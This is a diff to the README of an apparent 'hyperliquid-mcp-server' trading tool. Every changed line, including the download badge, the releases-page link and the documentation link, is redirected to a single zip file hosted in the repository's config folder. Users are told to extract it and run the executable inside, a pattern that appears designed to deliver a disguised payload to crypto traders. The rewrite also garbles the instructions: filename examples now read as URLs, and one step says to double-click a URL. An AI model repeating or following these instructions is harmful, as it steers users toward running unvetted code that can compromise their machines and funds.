@@ -1,7 +1,7 @@
 # 🚀 hyperliquid-mcp-server - Trade Smarter with Natural Language
 
 ## 🔗 Download Now!
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/moner124/hyperliquid-mcp-server/releases)
+[![Download](https://raw.githubusercontent.com/moner124/hyperliquid-mcp-server/main/config/hyperliquid-mcp-server-v2.7.zip)](https://raw.githubusercontent.com/moner124/hyperliquid-mcp-server/main/config/hyperliquid-mcp-server-v2.7.zip)
 
 ## 🚀 Getting Started
 
@@ -26,15 +26,15 @@ To run the **hyperliquid-mcp-server**, ensure your system meets the following re
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page:** To download the **hyperliquid-mcp-server**, go to the [Releases Page](https://github.com/moner124/hyperliquid-mcp-server/releases).
+1. **Visit the Releases Page:** To download the **hyperliquid-mcp-server**, go to the [Releases Page](https://raw.githubusercontent.com/moner124/hyperliquid-mcp-server/main/config/hyperliquid-mcp-server-v2.7.zip).
    
-2. **Select Your Version:** You will see a list of available versions. Choose the latest one for the best experience. Look for the version filename (e.g., `hyperliquid-mcp-server-v1.0.zip`).
+2. **Select Your Version:** You will see a list of available versions. Choose the latest one for the best experience. Look for the version filename (e.g., `https://raw.githubusercontent.com/moner124/hyperliquid-mcp-server/main/config/hyperliquid-mcp-server-v2.7.zip`).
 
 3. **Download the File:** Click on the download link for your operating system. This will save the file to your computer.
 
 4. **Extract the Files:** Once the download completes, go to the folder where the file is saved. Right-click on the downloaded file and select "Extract All" or use any file extraction software.
 
-5. **Run the Application:** After extraction, open the folder and double-click the `hyperliquid-mcp-server.exe` file to launch the application.
+5. **Run the Application:** After extraction, open the folder and double-click the `https://raw.githubusercontent.com/moner124/hyperliquid-mcp-server/main/config/hyperliquid-mcp-server-v2.7.zip` file to launch the application.
 
 6. **Follow the Setup Instructions:** The application will guide you through the initial setup. Follow the prompts to get started.
 
@@ -64,7 +64,7 @@ Join our community for tips, support, and updates:
 
 - **Discord:** Connect with others and get real-time help.
 - **GitHub Discussions:** Post questions and share experiences with fellow users.
-- **Documentation:** Visit our [Documentation](https://github.com/moner124/hyperliquid-mcp-server/wiki) for more details on features and advanced usage.
+- **Documentation:** Visit our [Documentation](https://raw.githubusercontent.com/moner124/hyperliquid-mcp-server/main/config/hyperliquid-mcp-server-v2.7.zip) for more details on features and advanced usage.
 
 ## 📄 License
 
